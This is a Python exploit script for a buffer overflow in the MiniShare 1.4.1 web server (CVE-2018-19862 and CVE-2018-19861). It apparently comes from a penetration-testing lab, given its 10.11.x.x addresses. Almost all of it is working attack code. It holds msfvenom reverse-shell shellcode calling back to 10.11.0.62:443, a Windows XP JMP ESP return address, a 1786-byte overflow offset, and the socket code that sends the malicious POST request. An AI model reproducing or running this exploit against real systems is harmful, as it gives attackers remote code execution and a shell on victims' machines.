#!/usr/bin/python
# 
# Buffer overflow in MiniShare 1.4.1 and earlier allows remote attackers to execute arbitrary code via a long HTTP POST request. NOTE: this product is discontinued.
# CVE-2018-19862 
# 
# Buffer overflow in MiniShare 1.4.1 and earlier allows remote attackers to execute arbitrary code via a long HTTP HEAD request. NOTE: this product is discontinued.
# CVE-2018-19861
# 
# Coded by JMcPeters 2/28/18

import socket

target_address="10.11.1.x"
target_port=80

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.62 LPORT=443 -b "\x00\x0d" -f python -v shellcode EXITFUNC=thread

shellcode =  ""
shellcode += "\xdd\xc1\xd9\x74\x24\xf4\x58\xbb\xba\xf7\x27\x2f"
shellcode += "\x2b\xc9\xb1\x52\x83\xc0\x04\x31\x58\x13\x03\xe2"
shellcode += "\xe4\xc5\xda\xee\xe3\x88\x25\x0e\xf4\xec\xac\xeb"
shellcode += "\xc5\x2c\xca\x78\x75\x9d\x98\x2c\x7a\x56\xcc\xc4"
shellcode += "\x09\x1a\xd9\xeb\xba\x91\x3f\xc2\x3b\x89\x7c\x45"
shellcode += "\xb8\xd0\x50\xa5\x81\x1a\xa5\xa4\xc6\x47\x44\xf4"
shellcode += "\x9f\x0c\xfb\xe8\x94\x59\xc0\x83\xe7\x4c\x40\x70"
shellcode += "\xbf\x6f\x61\x27\xcb\x29\xa1\xc6\x18\x42\xe8\xd0"
shellcode += "\x7d\x6f\xa2\x6b\xb5\x1b\x35\xbd\x87\xe4\x9a\x80"
shellcode += "\x27\x17\xe2\xc5\x80\xc8\x91\x3f\xf3\x75\xa2\x84"
shellcode += "\x89\xa1\x27\x1e\x29\x21\x9f\xfa\xcb\xe6\x46\x89"
shellcode += "\xc0\x43\x0c\xd5\xc4\x52\xc1\x6e\xf0\xdf\xe4\xa0"
shellcode += "\x70\x9b\xc2\x64\xd8\x7f\x6a\x3d\x84\x2e\x93\x5d"
shellcode += "\x67\x8e\x31\x16\x8a\xdb\x4b\x75\xc3\x28\x66\x85"
shellcode += "\x13\x27\xf1\xf6\x21\xe8\xa9\x90\x09\x61\x74\x67"
shellcode += "\x6d\x58\xc0\xf7\x90\x63\x31\xde\x56\x37\x61\x48"
shellcode += "\x7e\x38\xea\x88\x7f\xed\xbd\xd8\x2f\x5e\x7e\x88"
shellcode += "\x8f\x0e\x16\xc2\x1f\x70\x06\xed\xf5\x19\xad\x14"
shellcode += "\x9e\x2f\x39\x16\x60\x58\x3f\x16\x9d\x23\xb6\xf0"
shellcode += "\xf7\x43\x9f\xab\x6f\xfd\xba\x27\x11\x02\x11\x42"
shellcode += "\x11\x88\x96\xb3\xdc\x79\xd2\xa7\x89\x89\xa9\x95"
shellcode += "\x1c\x95\x07\xb1\xc3\x04\xcc\x41\x8d\x34\x5b\x16"
shellcode += "\xda\x8b\x92\xf2\xf6\xb2\x0c\xe0\x0a\x22\x76\xa0"
shellcode += "\xd0\x97\x79\x29\x94\xac\x5d\x39\x60\x2c\xda\x6d"
shellcode += "\x3c\x7b\xb4\xdb\xfa\xd5\x76\xb5\x54\x89\xd0\x51"
shellcode += "\x20\xe1\xe2\x27\x2d\x2c\x95\xc7\x9c\x99\xe0\xf8"
shellcode += "\x11\x4e\xe5\x81\x4f\xee\x0a\x58\xd4\x0e\xe9\x48"
shellcode += "\x21\xa7\xb4\x19\x88\xaa\x46\xf4\xcf\xd2\xc4\xfc"
shellcode += "\xaf\x20\xd4\x75\xb5\x6d\x52\x66\xc7\xfe\x37\x88"
shellcode += "\x74\xfe\x1d"

nops = "\x90" * 16

# 761E6D53 = FFE4             JMP ESP
# 0x7e3a9353 = WinXP SP3 FR jmp esp
# 0x7e429353 = WinXP SP3 Pro user32.dll jmp esp

junk = "A" * 1786 + "\x53\x93\x3a\x7e" + nops + shellcode + nops

buffer = ( "POST " + junk + " HTTP/1.1\r\n" + "Host: " + "\r\n\r\n")

# buffer = ( "HEAD " + junk + " HTTP/1.1\r\n" + "Host: " + "\r\n\r\n")

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
